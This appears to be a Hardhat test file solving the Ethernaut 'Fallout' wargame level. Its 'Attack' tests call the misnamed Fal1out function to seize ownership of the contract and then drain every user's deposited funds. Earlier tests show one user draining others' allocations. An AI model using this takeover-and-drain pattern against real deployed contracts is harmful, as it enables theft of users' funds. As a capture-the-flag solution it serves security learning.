const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
const utils = require("../scripts/lib/utils");

const provider = waffle.provider;

describe("Ethernaut Fallout", function () {		  
	let contract;				//contracts
	let owner, addr1;			//accounts
	
	beforeEach(async function () {
		[owner, addr1,...addrs] = await ethers.getSigners();
        
        //contract
		contract = await utils.deployContractSilent("Fallout");
	});
	      
	describe("Initial State", function () {
		it("initial owner", async function () {
			//the owner was never set because there is no real constructor 
            expect(await (contract.owner())).to.equal("0x0000000000000000000000000000000000000000");
		});
		
		it("initial balances", async function () {
            expect(await (contract.allocatorBalance(owner.address))).to.equal(0);
            expect(await (contract.allocatorBalance(addr1.address))).to.equal(0);
		});
    });    
	      
	describe("Allocation", function () {
		it("can allocate", async function () {
			//allocate 100 wei
			await contract.connect(owner).allocate({value:100});
			
			//expect that the balance has been received & recorded 
			expect(await contract.allocatorBalance(owner.address)).to.be.equal(100);
			expect(await provider.getBalance(contract.address)).to.be.equal(100);
		});
		
		it("can transfer allocation", async function () {
			//allocate 100 wei
			await contract.connect(owner).allocate({value:100});
			expect(await provider.getBalance(contract.address)).to.be.equal(100);
			
			//verify that we can receive that balance back 
			await contract.sendAllocation(owner.address); 
			expect(await provider.getBalance(contract.address)).to.be.equal(0);
		});
		
		it("can transfer allocation multiple times", async function () {
			//2 users allocate 100 wei each
			await contract.connect(owner).allocate({value:100});
			await contract.connect(addr1).allocate({value:100});
			expect(await provider.getBalance(contract.address)).to.be.equal(200);
			
			//verify that one user can drain the balance of everyone
			await contract.sendAllocation(owner.address); 
			expect(await provider.getBalance(contract.address)).to.be.equal(100);
			await contract.sendAllocation(owner.address); 
			expect(await provider.getBalance(contract.address)).to.be.equal(0);
		});
    });    
	
	describe("Ownership Restrictions", function(){
		it("can't collection allocations", async function () {
			//caller of collectAllocations must be owner 
			await contract.connect(owner).allocate({value:100});
			await expect(contract.collectAllocations()).to.be.revertedWith("caller is not the owner");
		});
	});
	
	describe("Attack", function () {
		it("can become owner of contract", async function () {
			//there is no owner 
            expect(parseInt(await (contract.owner()))).to.be.equal(0);
			
			//make addr1 the owner by paying 1 wei to Fal1out function
			await contract.connect(addr1).Fal1out({value:1});
			
			//verify that addr1 is owner 
            expect(await (contract.owner())).to.equal(addr1.address);
		});
		
		it("claim ownership of contract and its balance", async function () {
			//users pay into contract
			await contract.connect(owner).allocate({value:100});
			await contract.connect(addr1).allocate({value:100});
			
			//make addr1 the owner by paying 1 wei to Fal1out function
			await contract.connect(addr1).Fal1out({value:1});
			
			//verify contract balance before drain
            expect(await (provider.getBalance(contract.address))).to.equal(201);
			
			//drain & verify balance
			await contract.connect(addr1).collectAllocations();
            expect(await (provider.getBalance(contract.address))).to.equal(0);
		});
	});
});